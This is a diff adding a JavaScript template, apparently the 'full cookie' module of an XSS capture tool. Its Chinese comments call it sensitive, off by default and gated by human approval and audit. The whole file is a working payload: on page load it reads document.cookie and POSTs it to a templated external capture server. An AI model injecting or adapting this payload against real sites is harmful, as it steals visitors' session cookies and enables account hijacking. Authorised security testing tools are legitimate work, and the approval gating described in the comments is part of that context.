@@ -1,0 +1,24 @@
+// fullcookie.js.tmpl — 完整 Cookie 模組（敏感：預設關閉，arming 需 HITL 核准）。
+//
+// 這支與 xss.go 頂部「never collects session cookies」的預設立場直接衝突，
+// 因此存在本身就是例外路徑：payload 建立時顯式勾選 + HITL 核准 + 稽核
+// 單獨署名，三關全過才會被渲染進 payload JS。值長度由伺服器
+// XssMaxCaptureBytes 統一裁切。
+(function () {
+  "use strict";
+  var TOKEN = {{ .Token | printf "%q" }};
+  var BASE = {{ .CaptureBase | printf "%q" }};
+
+  function send() {
+    var c;
+    try { c = document.cookie || ""; } catch (e) { c = ""; }
+    var body = "kind=fullcookie&data=" + encodeURIComponent(c);
+    var x = new XMLHttpRequest();
+    x.open("POST", BASE + "/" + TOKEN, true);
+    x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    x.send(body);
+  }
+
+  if (document.readyState === "complete") { send(); }
+  else { window.addEventListener("load", send); }
+})();
